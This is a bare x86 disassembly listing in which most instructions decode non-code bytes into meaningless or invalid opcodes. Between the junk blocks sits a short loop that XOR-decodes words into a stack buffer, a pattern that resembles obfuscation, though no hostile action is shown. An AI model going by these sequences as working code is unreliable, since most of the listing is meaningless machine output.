  4048d2:	add    BYTE PTR [edx+eiz*2+0x2749ff02],ch
  4048d9:	mov    dl,0x71
  4048db:	push   edx
  4048dc:	jecxz  0x4048fd
  4048de:	add    BYTE PTR [ecx-0x37],bh
  4048e1:	sbb    BYTE PTR [ebp-0x29],cl
  4048e4:	pop    ebx
  4048e5:	call   0x7331:0x1a662585
  4048ec:	jnp    0x40490b
  4048ee:	jge    0x404916
  4048f0:	fdiv   st,st(0)
  4048f2:	pop    esp
  4048f3:	xchg   ebp,eax
  4048f4:	mov    al,0xe3
  4048f6:	cmp    al,BYTE PTR [esi+eiz*4-0x7e4fbfce]
  4048fd:	mov    ?,WORD PTR ds:0xe6dbd83f
  404903:	xchg   esp,eax
  404904:	(bad)  
  404905:	icebp  
  404906:	jb     0x4048e7
  404908:	loop   0x40494b
  40490a:	fstp   st(6)
  40490c:	outs   dx,BYTE PTR ds:[esi]
  40490d:	cs jne 0x404972
  404910:	push   eax
  404911:	xor    BYTE PTR [esi],dl
  404913:	mov    cl,0x89
  404915:	add    ecx,DWORD PTR [ebx-0x2ecc0bbb]
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	addr16 adc eax,0x21c9c98f
  4049c1:	jo     0x404a33
  4049c3:	cmp    eax,0xf70707d
  4049c8:	pop    ecx
  4049c9:	jae    0x404a03
  4049cb:	or     BYTE PTR [edx],ch
  4049cd:	jmp    0xc7624285
  4049d2:	popf   
  4049d3:	icebp  
  4049d4:	test   al,0x76
  4049d6:	rcr    BYTE PTR [edx],cl
  4049d8:	(bad)  
  4049d9:	jge    0x404981
  4049db:	call   0xbb04:0x4fd7d5fc
  4049e2:	fs daa 
  4049e4:	mov    eax,ds:0xad084b7
  4049e9:	push   esi
  4049ea:	xchg   BYTE PTR [ebp+0x4f],ah
  4049ed:	cmp    al,0x57
  4049ef:	cmp    DWORD PTR ss:[esi],esi
  4049f2:	nop
  4049f3:	mov    eax,ds:0xe314feeb
  4049f8:	push   cs
  4049f9:	sar    BYTE PTR ds:0xeaf026f6,1
  4049ff:	cdq    
  404a00:	and    eax,0x8457c97
  404a05:	loop   0x404999
  404a07:	inc    ebx
  404a08:	adc    eax,0x40e46202
  404a0d:	outs   dx,DWORD PTR ds:[esi]
  404a0e:	push   cs
  404a0f:	dec    edi
  404a10:	popf   
  404a11:	mov    ebx,0x97ab7b06
  404a16:	mov    edx,DWORD PTR [ecx-0x60c42ffa]
  404a1c:	jmp    0x2f71:0xfb6ad7c4
  404a23:	pop    edi
  404a24:	push   0x72
  404a26:	fist   WORD PTR [esp+ebp*8-0xac43075]
  404a2d:	sbb    eax,0x2c351f
  404a32:	jns    0x404aa7
  404a34:	pop    es
  404a35:	dec    edi
  404a36:	sbb    eax,DWORD PTR [edi+0x33]
  404a39:	adc    bh,BYTE PTR [esi-0x47]
  404a3c:	mov    bl,0xae
  404a3e:	sbb    al,0x6f
  404a40:	and    al,0x3e
  404a42:	push   ds
  404a43:	push   0x7a16aef8
  404a48:	jae    0x404a43
  404a4a:	mov    bh,0x97
  404a4c:	push   ebx
  404a4d:	pop    ebx
  404a4e:	pop    ecx
  404a4f:	sbb    eax,0x5e1739c7
  404a54:	bound  ebp,QWORD PTR [edi-0x54]
  404a57:	in     al,0xb
  404a59:	xchg   esp,eax
  404a5a:	jae    0x404a79
  404a5c:	in     al,0x43
  404a5e:	icebp  
  404a5f:	mov    ebp,0x46b096fa
  404a64:	daa    
  404a65:	loopne 0x404a03
  404a67:	pop    edi
  404a68:	mov    eax,ebp
  404a6a:	add    dh,ah
  404a6c:	scas   eax,DWORD PTR es:[edi]
  404a6d:	out    0xfe,al
  404a6f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  404a71:	inc    edx
  404a72:	jns    0x404a78
  404a74:	sbb    eax,0x80292f5b
  404a79:	inc    ebp
  404a7a:	ret    
  404a7b:	sub    eax,0x19844dc8
  404a80:	(bad)
  404a83:	loop   0x404adf
  404a85:	or     BYTE PTR [esp+ebp*2],ch
  404a88:	pop    eax
  404a89:	cli    
  404a8a:	nop
  404a8b:	xchg   edx,eax
  404a8c:	jae    0x404a92
  404a8e:	push   ebx
  404a8f:	stos   BYTE PTR es:[edi],al
  404a90:	xlat   BYTE PTR ds:[ebx]
  404a91:	mov    ebx,DWORD PTR [bx]
  404a94:	loopne 0x404a60
  404a96:	push   0x52283adf
  404a9b:	sbb    dl,BYTE PTR ds:0x4f6bf516
  404aa1:	jl     0x404ada
  404aa3:	sti    
  404aa4:	sub    ah,dh
  404aa6:	and    al,0xe9
  404aa8:	loope  0x404b15
  404aaa:	jne    0x404b29
  404aac:	test   al,0xc9
  404aae:	neg    BYTE PTR [esi]
  404ab0:	push   ss
  404ab1:	pop    esi
  404ab2:	adc    DWORD PTR [eax+0x19],0x97826119
  404ab9:	inc    esp
  404aba:	and    BYTE PTR [edi+0x3d],0xd3
  404abe:	popf   
  404abf:	adc    al,0x38
  404ac1:	(bad)  
  404ac2:	and    DWORD PTR [ecx],esi
  404ac4:	xor    eax,DWORD PTR [esp+edx*1-0x140f613e]
  404acb:	jae    0x404af2
  404acd:	push   es
  404ace:	mov    dl,0x82
  404ad0:	scas   eax,DWORD PTR es:[edi]
  404ad1:	lock xor DWORD PTR [ecx-0x32],esp
  404ad5:	jo     0x404a78
  404ad7:	jae    0x404b1e
  404ad9:	pushf  
  404ada:	mov    edi,0xfaabf899
  404adf:	and    ebp,DWORD PTR [ebx]
  404ae1:	out    dx,al
  404ae2:	jns    0x404a6f
  404ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ae5:	sub    DWORD PTR [edi+0x8],ebx
  404ae8:	xchg   ecx,eax
  404ae9:	repz add esp,DWORD PTR [edi]
  404aec:	cmp    BYTE PTR [ecx-0x752efc80],ah
  404af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404af3:	cmp    cl,bh
  404af5:	sbb    esi,esp
  404af7:	mov    bh,0xb8
  404af9:	mov    esi,0xa7edb7ba
  404afe:	clc    
  404aff:	sti    
  404b00:	into   
  404b01:	fnstcw WORD PTR ds:0x43d90a18
  404b07:	push   ebx
  404b08:	push   esi
  404b09:	scas   eax,DWORD PTR es:[edi]
  404b0a:	daa    
  404b0b:	repnz mov edx,0x91ba2c9
  404b11:	retf   
  404b12:	and    ah,dh
  404b14:	sbb    al,0xce
  404b16:	les    edi,FWORD PTR [ebp+0x38]
  404b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b1a:	jge    0x404aba
  404b1c:	cld    
  404b1d:	mov    bh,0xf2
  404b1f:	cmp    eax,0x961bd2a6
  404b24:	and    esi,DWORD PTR [esi+0x46a1abd0]
  404b2a:	rol    BYTE PTR [esi-0x78107e9c],1
  404b30:	test   BYTE PTR [ecx-0x5],bl
  404b33:	inc    ebp
  404b34:	push   ecx
  404b35:	pop    ecx
  404b36:	or     BYTE PTR [edx-0x6036013],bl
  404b3c:	dec    eax
  404b3d:	push   ecx
  404b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b3f:	cmp    al,0x81
  404b41:	mov    al,0x7c
  404b43:	mov    ch,0xa9
  404b45:	fs (bad) 
  404b48:	in     al,dx
  404b49:	mov    bh,BYTE PTR [esi+0x55a24353]
  404b4f:	cld    
  404b50:	pop    edi
  404b51:	and    ch,ah
  404b53:	push   es
  404b54:	dec    ecx
  404b55:	xor    DWORD PTR [ebx],0xffffffcd
  404b58:	xchg   BYTE PTR [esi-0xe],dh
  404b5b:	test   eax,0xb9ecd39
  404b60:	mov    ebp,es
  404b62:	ret    0xa46
  404b65:	mov    ds:0x6d8b7b9c,eax
  404b6a:	and    eax,DWORD PTR [ecx-0x3d3f212b]
  404b70:	mov    edx,0xee33fbe0
  404b75:	scas   al,BYTE PTR es:[edi]
  404b76:	rcl    eax,0x31
  404b79:	ror    DWORD PTR [ecx-0x59e3cf13],0x18
  404b80:	mov    ah,0xa5
  404b82:	cmc    
  404b83:	mov    DWORD PTR [eax-0x66d6533f],esp
  404b89:	jno    0x404c00
  404b8b:	rcl    bh,1
  404b8d:	dec    ebx
  404b8e:	push   ds
  404b8f:	iret   
  404b90:	inc    edi
  404b91:	fdivr  st,st(0)
  404b93:	mov    eax,ds:0x7b07f5c2
  404b98:	outs   dx,DWORD PTR ds:[esi]
  404b99:	xchg   ecx,eax
  404b9a:	mov    ah,0x90
  404b9c:	icebp  
  404b9d:	test   DWORD PTR [edx+edx*2],ebp
  404ba0:	mov    bh,0xb8
  404ba2:	xlat   BYTE PTR ds:[ebx]
  404ba3:	dec    eax
  404ba4:	sbb    al,0xae
  404ba6:	mov    eax,ds:0x977feb93
  404bab:	jl     0x404bff
  404bad:	idiv   esp
  404baf:	dec    ebp
  404bb0:	in     eax,dx
  404bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb2:	cmc    
  404bb3:	pop    esi
  404bb4:	test   al,0xfb
  404bb6:	in     eax,0x72
  404bb8:	mov    bh,0x1b
  404bba:	dec    edi
  404bbb:	adc    al,0xbd
  404bbd:	push   edi
  404bbe:	enter  0x4ded,0x2b
  404bc2:	inc    esp
  404bc3:	pmulhw mm6,QWORD PTR [edi]
  404bc6:	mov    ecx,0x72212ee8
  404bcb:	dec    ebx
  404bcc:	ins    DWORD PTR es:[edi],dx
  404bcd:	mov    dl,cl
  404bcf:	dec    ecx
  404bd0:	popa   
  404bd1:	pop    ebx
  404bd2:	and    dh,al
  404bd4:	fisttp DWORD PTR [esi+0x24]
  404bd7:	leave  
  404bd8:	mov    edx,0x5a3c433f
  404bdd:	(bad)  
  404bde:	mov    dh,0x3
  404be0:	(bad)  
  404be1:	jb     0x404c50
  404be3:	push   esi
  404be4:	shl    BYTE PTR [ebx+esi*4-0x16],1
  404be8:	or     BYTE PTR [edi],ah
  404bea:	les    ebx,FWORD PTR [edx-0x61]
  404bed:	xor    esp,DWORD PTR [ebx+0x35997491]
  404bf3:	sbb    esi,DWORD PTR [eax+0x73]
  404bf6:	rol    bl,0x45
  404bf9:	in     al,0xd3
  404bfb:	out    0xba,al
  404bfd:	cwde   
  404bfe:	(bad)  
  404bff:	xchg   edi,eax
  404c00:	in     eax,dx
  404c01:	xchg   DWORD PTR [edx],ebx
  404c03:	(bad)  
  404c04:	ins    DWORD PTR es:[edi],dx
  404c05:	jle    0x404c1f
  404c07:	push   edi
  404c08:	mov    gs,WORD PTR [esp+esi*1-0x1d05eb08]
  404c0f:	enter  0x6e6a,0x69
  404c13:	outs   dx,DWORD PTR ds:[esi]
  404c14:	jmp    FWORD PTR [ebp-0x15b8a2b1]
  404c1a:	jmp    0x404bf0
  404c1c:	out    0x1e,eax
  404c1e:	push   cs
  404c1f:	push   edi
  404c20:	add    al,0x81
  404c22:	cs jnp 0x404c27
  404c25:	pcmpgtw mm2,QWORD PTR [ebx-0x506b4776]
  404c2c:	popf   
  404c2d:	cli    
  404c2e:	dec    esi
  404c2f:	mov    ebx,DWORD PTR [ebx+eiz*2+0x6c]
  404c33:	retf   0xc826
  404c36:	jmp    0xc74d:0x342bb3c7
  404c3d:	xchg   ecx,eax
  404c3e:	or     edi,esi
  404c40:	(bad)  [edx+edx*1+0x2ce4b856]
  404c47:	mov    eax,ds:0x5c76ba8a
  404c4c:	and    edi,DWORD PTR [edx]
  404c4e:	(bad)  
  404c4f:	mov    edi,0xffe421b7
  404c54:	fidiv  DWORD PTR [ecx]
  404c56:	xchg   ebx,eax
  404c57:	mov    ds:0xfdbb9413,eax
  404c5c:	sub    DWORD PTR [eax],ebx
  404c5e:	xchg   ecx,eax
  404c5f:	mov    ebp,DWORD PTR [edi]
  404c61:	mov    gs,WORD PTR [edx]
  404c63:	fcmovu st,st(0)
  404c65:	cld    
  404c66:	loopne 0x404c5b
  404c68:	or     DWORD PTR [ecx-0x1b],esp
  404c6b:	test   al,0xd2
  404c6d:	and    al,0x86
  404c6f:	dec    ebx
  404c70:	sbb    eax,0xeb726d95
  404c75:	inc    esp
  404c76:	test   edx,ebp
  404c78:	call   0x42e064f9
  404c7d:	(bad)  
  404c7e:	and    BYTE PTR [ebp+0x58],bl
  404c81:	xor    eax,0xccf56816
  404c86:	leave  
  404c87:	das    
  404c88:	sub    al,0xdf
  404c8a:	inc    esi
  404c8b:	xor    BYTE PTR ds:0x2eb551e5,cl
  404c91:	xchg   ebp,eax
  404c92:	dec    edx
  404c93:	sbb    edx,DWORD PTR [ebp+0x6d]
  404c96:	or     ebx,DWORD PTR [edi+0x4c]
  404c99:	outs   dx,BYTE PTR ds:[esi]
  404c9a:	cs ss popa 
  404c9d:	adc    DWORD PTR [ebp-0x21124e32],ecx
  404ca3:	cli    
  404ca4:	cmc    
  404ca5:	sub    DWORD PTR [ebx+0x3c],esi
  404ca8:	scas   al,BYTE PTR es:[edi]
  404ca9:	mov    BYTE PTR [edx-0xfefd325],ch
  404caf:	jae    0x404cc6
  404cb1:	sahf   
  404cb2:	dec    ecx
  404cb3:	in     eax,dx
  404cb4:	aam    0xd5
  404cb6:	adc    ch,BYTE PTR [ecx-0x43]
  404cb9:	outs   dx,BYTE PTR ds:[esi]
  404cba:	cwde   
  404cbb:	sbb    al,0x78
  404cbd:	hlt    
  404cbe:	pop    es
  404cbf:	pop    esi
  404cc0:	pop    esp
  404cc1:	cli    
  404cc2:	jbe    0x404cfc
  404cc4:	push   0xffffffb0
  404cc6:	outs   dx,DWORD PTR ds:[esi]
  404cc7:	lock sbb al,0xe1
  404cca:	stc    
  404ccb:	enter  0x2e25,0x2a
  404ccf:	dec    esi
  404cd0:	pop    esi
  404cd1:	xchg   esi,eax
  404cd2:	or     esi,eax
  404cd4:	dec    eax
  404cd5:	mov    bl,0x39
  404cd7:	inc    eax
  404cd8:	mov    WORD PTR fs:[ebp+0x4ec075ba],cs
  404cdf:	ins    BYTE PTR es:[edi],dx
  404ce0:	pop    ebp
  404ce1:	leave  
  404ce2:	(bad)  
  404ce3:	jns    0x404cf4
  404ce5:	mov    esp,0xabf80fb
  404cea:	xchg   esp,eax
  404ceb:	push   eax
  404cec:	pop    esi
  404ced:	popf   
  404cee:	test   al,0xbe
  404cf0:	neg    DWORD PTR [ebx]
  404cf2:	jb     0x404ca1
  404cf4:	mov    ebx,DWORD PTR [ebp-0x46]
  404cf7:	mov    eax,ds:0x1d74190f
  404cfc:	lods   eax,DWORD PTR ds:[esi]
  404cfd:	in     eax,0x99
  404cff:	sub    dl,bl
  404d01:	mov    ?,WORD PTR ds:[ebx-0x1dd43c60]
  404d08:	and    edx,DWORD PTR [ebx]
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x40]
  404d39:	out    dx,eax
  404d3a:	imul   ebx,DWORD PTR [eax-0x6a],0x2e
  404d3e:	jo     0x404db0
  404d40:	cmp    eax,0x8170707d
  404d45:	push   ecx
  404d46:	adc    BYTE PTR [ebx-0x38af278d],ch
  404d4c:	push   ds
  404d4d:	cmp    ecx,ebx
  404d4f:	test   DWORD PTR [ecx],0xeffcae65
  404d55:	gs pop es
  404d57:	mov    ss,WORD PTR [eax]
  404d59:	fsubr  st(4),st
  404d5b:	ror    BYTE PTR [edi],0x69
  404d5e:	xchg   ebx,eax
  404d5f:	cmp    eax,0xcb65fae7
  404d64:	inc    edi
  404d65:	lds    ecx,FWORD PTR [edi+0x701e52a8]
  404d6b:	sar    DWORD PTR [eax],0x1a
  404d6e:	sahf   
  404d6f:	repz sbb edx,DWORD PTR [edi+esi*8]
  404d73:	push   ebx
  404d74:	mov    WORD PTR [ebx+edx*2+0x2b209b3],cs
  404d7b:	pop    esp
  404d7c:	out    0xdb,eax
  404d7e:	jb     0x404deb
  404d80:	scas   al,BYTE PTR es:[edi]
  404d81:	test   esi,0xdcc17f60
  404d87:	xlat   BYTE PTR ds:[ebx]
  404d88:	les    ebp,FWORD PTR [ebp+0x1aa758d]
  404d8e:	ins    BYTE PTR es:[edi],dx
  404d8f:	jmp    0x5903:0x68867702
  404d96:	push   es
  404d97:	mov    bl,0xa8
  404d99:	sti    
  404d9a:	push   ss
  404d9b:	adc    al,0x54
  404d9d:	(bad)  
  404d9e:	(bad)  
  404d9f:	das    
  404da0:	call   0x83aee26b
  404da5:	leave  
  404da6:	in     al,dx
  404da7:	pop    ebx
  404da8:	ffreep st(0)
  404daa:	in     eax,0xd1
  404dac:	test   al,0x13
  404dae:	imul   edx,edx,0xffffff9d
  404db1:	xor    bl,BYTE PTR [edi-0x308c07f6]
  404db7:	jmp    0x1558ab9
  404dbc:	sub    edx,ecx
  404dbe:	xor    al,0x1e
  404dc0:	or     DWORD PTR [edi+0x26f41e5e],0xf0dc8a63
  404dca:	push   ebx
  404dcb:	popf   
  404dcc:	xchg   BYTE PTR [edi+ecx*4+0x621dc2ca],bl
  404dd3:	setp   BYTE PTR [edi+0x4c]
  404dd7:	mov    edi,0xee9eb8d7
  404ddc:	jp     0x404dd4
  404dde:	mov    ebp,0x4b850d2b
  404de3:	fisub  DWORD PTR [ebp*4-0x16a32af9]
  404dea:	or     DWORD PTR [esi+0x25],ecx
  404ded:	loop   0x404d9d
  404def:	and    BYTE PTR [edi],dl
  404df1:	test   eax,0x3eba0030
  404df6:	test   eax,0x4a18bc5f
  404dfb:	ins    BYTE PTR es:[edi],dx
  404dfc:	scas   eax,DWORD PTR es:[edi]
  404dfd:	inc    esi
  404dfe:	mov    esp,0xd75a36bc
  404e03:	lahf   
  404e04:	iret   
  404e05:	lahf   
  404e06:	pop    ebx
  404e07:	jmp    0x5df1:0x25521a5e
  404e0e:	(bad)  
  404e0f:	test   eax,0xa1d729fe
  404e14:	cdq    
  404e15:	cmp    al,0x22
  404e17:	mov    ebx,0x84ed425b
  404e1c:	mov    eax,0x7a1a676c
  404e21:	mov    eax,ds:0x247fd950
  404e26:	repz cmp al,0x28
  404e29:	lods   al,BYTE PTR ds:[esi]
  404e2a:	aad    0xf
  404e2c:	push   edi
  404e2d:	ds jmp 0xe6ed:0xa5b1b6ab
  404e35:	xchg   esp,eax
  404e36:	imul   esp,DWORD PTR [edx],0x35c483eb
  404e3c:	cdq    
  404e3d:	jns    0x404df5
  404e3f:	aam    0xb1
  404e41:	es popa 
  404e43:	push   ds
  404e44:	(bad)  
  404e45:	xor    al,0x9
  404e47:	(bad)  [ebx]
  404e49:	shl    ah,0x2f
  404e4c:	fs mov ecx,0x97555ca0
  404e52:	int    0x41
  404e54:	xor    edi,DWORD PTR [ebx+0x78]
  404e57:	dec    edx
  404e58:	mov    cl,0x18
  404e5a:	(bad)  
  404e5b:	outs   dx,BYTE PTR ds:[esi]
  404e5c:	sbb    BYTE PTR [ecx],dh
  404e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e5f:	add    bh,BYTE PTR [edi-0xd04e157]
  404e65:	pushfw 
  404e67:	idiv   DWORD PTR [ebp-0x5303d78e]
  404e6d:	push   0xfac38778
  404e72:	cld    
  404e73:	sbb    edx,0x4d4cdd13
  404e79:	mov    DWORD PTR [ebp+edi*4-0x317a5dff],edx
  404e80:	pop    ebp
  404e81:	add    al,BYTE PTR [ecx-0x3ddba74]
  404e87:	cmp    esi,DWORD PTR [edi]
  404e89:	stos   DWORD PTR es:[edi],eax
  404e8a:	jnp    0x404eb4
  404e8c:	pop    ebp
  404e8d:	mov    eax,ds:0xb31c4986
  404e92:	int    0x4a
  404e94:	inc    esi
  404e95:	shl    ebx,cl
  404e97:	mov    edi,0x68a3c23c
  404e9c:	sub    esi,esp
  404e9e:	and    bl,0x50
  404ea1:	pop    ecx
  404ea2:	add    ecx,DWORD PTR [edi-0x26bf9b34]
  404ea8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eaa:	mov    dl,0x46
  404eac:	xchg   ebp,eax
  404ead:	(bad)
  404eb0:	loope  0x404e9a
  404eb2:	retf   0x4b29
  404eb5:	mov    eax,0xd3731c96
  404eba:	ss das 
  404ebc:	outs   dx,BYTE PTR ds:[esi]
  404ebd:	dec    ebp
  404ebe:	add    al,0x7b
  404ec0:	lds    edi,FWORD PTR [eax+0x57]
  404ec3:	and    DWORD PTR [edx],ebx
  404ec5:	inc    edx
  404ec6:	hlt    
  404ec7:	inc    edx
  404ec8:	int    0xbe
  404eca:	pusha  
  404ecb:	fwait
  404ecc:	imul   esi,DWORD PTR [ebp+ecx*8+0x2f5380f4],0xa1d3cc83
  404ed7:	data16 mov ah,0xcc
  404eda:	sti    
  404edb:	(bad)  
  404edc:	std    
  404edd:	inc    esp
  404ede:	adc    edx,DWORD PTR [edi-0x43]
  404ee1:	stos   DWORD PTR es:[edi],eax
  404ee2:	add    eax,0xb501ba45
  404ee7:	sahf   
  404ee8:	dec    ebx
  404ee9:	sub    eax,0x474b83ef
  404eee:	scas   eax,DWORD PTR es:[edi]
  404eef:	enter  0x962d,0x31
  404ef3:	sub    al,BYTE PTR [ecx]
  404ef5:	add    DWORD PTR [ebx],ecx
  404ef7:	dec    ecx
  404ef8:	jns    0x404f73
  404efa:	gs add eax,0x9ce6f898
  404f00:	adc    edi,ebx
  404f02:	or     al,0xf4
  404f04:	xor    al,0x6f
  404f06:	bound  eax,QWORD PTR [eax]
  404f08:	out    0x98,eax
  404f0a:	and    eax,0xa55d15bd
  404f0f:	add    al,0x33
  404f11:	jo     0x404f28
  404f13:	lds    ebx,FWORD PTR [eax+eiz*8-0x598b748f]
  404f1a:	and    bl,ah
  404f1c:	mov    ds:0x302a933f,eax
  404f21:	xchg   DWORD PTR [edx-0x231ca3c6],edi
  404f27:	sub    DWORD PTR [ebp+esi*2+0x7267733a],esp
  404f2e:	push   eax
  404f2f:	mov    eax,ds:0x3bec7681
  404f34:	test   BYTE PTR [ecx-0x40ab9004],bl
  404f3a:	jle    0x404f64
  404f3c:	inc    esp
  404f3d:	mov    al,ds:0xf6522ba6
  404f42:	pop    ds
  404f43:	out    dx,eax
  404f44:	pop    eax
  404f45:	jns    0x404ee0
  404f47:	add    cl,BYTE PTR [edx+edi*1]
  404f4a:	test   DWORD PTR [edi],edx
  404f4c:	fst    st(1)
  404f4e:	std    
  404f4f:	bound  edi,QWORD PTR [ecx+0x2a]
  404f52:	test   al,0x9f
  404f54:	fidiv  DWORD PTR [ecx+0x42fa210e]
  404f5a:	jno    0x404f3f
  404f5c:	hlt    
  404f5d:	mov    cl,0x2b
  404f5f:	loop   0x404ef5
  404f61:	mov    edx,0x22837096
  404f66:	mov    dl,0xb6
  404f68:	mov    ebp,0xb4e4bfad
  404f6d:	pop    ecx
  404f6e:	aam    0xae
  404f70:	jns    0x404fb0
  404f72:	les    esp,FWORD PTR cs:[edi-0x4f]
  404f76:	pop    es
  404f77:	rol    BYTE PTR [esi-0x13],0x4b
  404f7b:	pop    esp
  404f7c:	nop
  404f7d:	jle    0x404ffe
  404f7f:	enter  0xc037,0x43
  404f83:	test   ch,dl
  404f85:	and    esp,DWORD PTR [edx-0x24]
  404f88:	cwde   
  404f89:	and    BYTE PTR [eax-0x708fe243],ah
  404f8f:	xchg   DWORD PTR [eax-0x61],edi
  404f92:	inc    esp
  404f93:	aas    
  404f94:	(bad)  
  404f95:	jmp    0xbb211899
  404f9a:	retf   0xc5bd
  404f9d:	pop    ss
  404f9e:	adc    DWORD PTR [ebx-0x202dff17],ecx
  404fa4:	adc    ebx,ecx
  404fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa7:	mul    ebp
  404fa9:	(bad)  
  404fae:	inc    ebx
  404faf:	xchg   eax,esp
  404fb1:	imul   esp,eax,0xa3a5750
  404fb7:	inc    eax
  404fb8:	push   ebp
  404fb9:	std    
  404fba:	xor    ecx,DWORD PTR [edi+0x72]
  404fbd:	test   DWORD PTR [esp+eiz*4],ecx
  404fc0:	shl    DWORD PTR [esp+eiz*8],1
  404fc3:	xor    eax,esp
  404fc5:	popa   
  404fc6:	sbb    ebx,ebx
  404fc8:	std    
  404fc9:	pop    ebx
  404fca:	or     al,dl
  404fcc:	fsubrp st(2),st
  404fce:	rcr    DWORD PTR [esi-0x54706f2b],cl
  404fd4:	loopne 0x404f99
  404fd6:	(bad)  [ecx+0x25f3b4dd]
  404fdc:	pop    esp
  404fdd:	xchg   ebx,eax
  404fde:	xchg   ecx,eax
  404fdf:	dec    edi
  404fe0:	leave  
  404fe1:	rol    BYTE PTR [esi-0x28],cl
  404fe4:	xor    edx,DWORD PTR [eax+0x1]
  404fe7:	mov    eax,0x582da679
  404fec:	lods   al,BYTE PTR ds:[esi]
  404fed:	mov    esi,0x3f4bb799
  404ff2:	clc    
  404ff3:	jl     0x404f83
  404ff5:	icebp  
  404ff6:	mov    ebp,0x9f9cd5bd
  404ffb:	or     esi,DWORD PTR [esi-0x3c04152e]
  405001:	clc    
  405002:	pop    esi
  405003:	fadd   DWORD PTR [ebp+0x52]
  405006:	cmp    eax,0x99db5c94
  40500b:	jnp    0x404fdd
  40500d:	cmp    DWORD PTR [ebp-0x1e],esi
  405010:	aaa    
  405011:	pop    ss
  405012:	lock add dh,dh
  405015:	fxch   st(7)
  405017:	pop    eax
  405018:	inc    esp
  405019:	test   bl,ch
  40501b:	xchg   edi,eax
  40501c:	mov    esp,0x3a36b5a8
  405021:	inc    ecx
  405022:	cmp    DWORD PTR cs:[esi],0x980f387f
  405029:	ret    
  40502a:	sub    BYTE PTR [ecx+0x6f],0xf6
  40502e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40502f:	outs   dx,BYTE PTR ds:[esi]
  405030:	js     0x405065
  405032:	std    
  405033:	xchg   ebx,eax
  405034:	adc    DWORD PTR [esi],ebp
  405036:	mov    ebp,0x80397e3c
  40503b:	popf   
  40503c:	xor    edx,ebp
  40503e:	enter  0x84df,0x32
  405042:	inc    edx
  405043:	or     cl,al
  405045:	cdq    
  405046:	pop    es
  405047:	sar    ebp,cl
  405049:	push   ds
  40504a:	mov    bh,0x1a
  40504c:	jbe    0x404feb
  40504e:	xor    BYTE PTR [esi],ah
  405050:	shl    BYTE PTR ds:0xd52705ba,cl
  405056:	sbb    al,0x6
  405058:	imul   ebx,DWORD PTR [edx+0x18],0x42
  40505c:	cmp    dl,dh
  40505e:	jb     0x405033
  405060:	popa   
  405061:	jbe    0x405001
  405063:	aaa    
  405064:	shl    BYTE PTR [edi+0x58947357],1
  40506a:	in     al,0xd5
  40506c:	cwde   
  40506d:	mov    dl,0xf3
  40506f:	shl    edx,1
  405071:	(bad)  
  405072:	and    al,0x7f
  405074:	jmp    0xf3f09a2a
  405079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40507a:	rol    ch,1
  40507c:	leave  
  40507d:	mul    BYTE PTR [ebx-0x52]
  405080:	pop    es
  405081:	mov    eax,0xa099a59
  405086:	pop    ss
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
